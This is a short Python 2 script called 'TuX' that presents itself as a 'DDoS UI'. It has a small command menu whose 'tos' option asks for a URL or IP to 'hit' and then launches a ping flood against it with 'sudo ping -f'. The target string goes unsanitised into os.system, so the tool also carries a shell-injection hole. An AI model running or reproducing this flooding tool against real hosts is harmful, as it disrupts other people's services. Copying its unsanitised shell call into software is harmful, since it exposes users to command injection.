import os
import sys
import time

def main():
	print("TuX | Coded by: PythonCodex")
	print("---------------------------")
	print(" ")
	tux1 = raw_input("tux> ")
	if "help" in tux1:
		print(" ")
		print("help - shows list of commands")
		print("tos - starts the DDoS UI")
		print("ver - shows version of TuX")
		print("qt - quits the program")
		print(" ")
		main()
	if "tos" in tux1:
		print(" ")
		print("Type in the URL / IP you want to hit.")
		print(" ")
		tos = raw_input("tux/tos> ")
		print(" ")
		os.system("sudo ping -f " + tos)
		time.sleep(4)
		main()
	if "ver" in tux1:
		print(" ")
		print("TuX v1.0")
		print(" ")
		main()
	if "qt" in tux1:
		os.system("clear")
		sys.exit()
	else:
		print(" ")
		print(tux1 + " is not a command.")
		print(" ")
		main()

main()
